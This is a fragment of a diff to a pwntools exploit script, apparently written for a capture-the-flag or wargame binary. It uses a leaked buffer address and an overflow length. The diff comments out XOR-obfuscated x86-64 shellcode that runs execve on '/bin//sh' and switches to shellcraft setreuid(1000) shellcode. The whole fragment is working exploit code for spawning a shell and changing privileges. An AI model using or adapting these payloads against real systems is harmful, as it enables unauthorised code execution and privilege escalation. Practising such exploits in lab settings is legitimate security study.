@@ -17,19 +17,19 @@ buffid = p.recvlines(1)
 lengthofbuff = 168
 buffid1 = buffid[0]
 buffid2 = int(buffid1,16)
-shell_string = '''
-xor esi, esi
-push rsi
-mov rbx, 0x6a712d2d6c6b602d
-mov r9, 0x0202020202020202
-xor rbx,r9
-push rbx
-push rsp
-pop rdi
-imul esi
-mov al, 0x3b
-syscall
-'''
+# shell_string = '''
+# xor esi, esi
+# push rsi
+# mov rbx, 0x6a712d2d6c6b602d
+# mov r9, 0x0202020202020202
+# xor rbx,r9
+# push rbx
+# push rsp
+# pop rdi
+# imul esi
+# mov al, 0x3b
+# syscall
+# '''
 # payload = asm(shellcraft.setreuid(1017))
 shellcode_reuid = shellcraft.setreuid(1000)
 payload = asm(shellcraft.setreuid(1000))
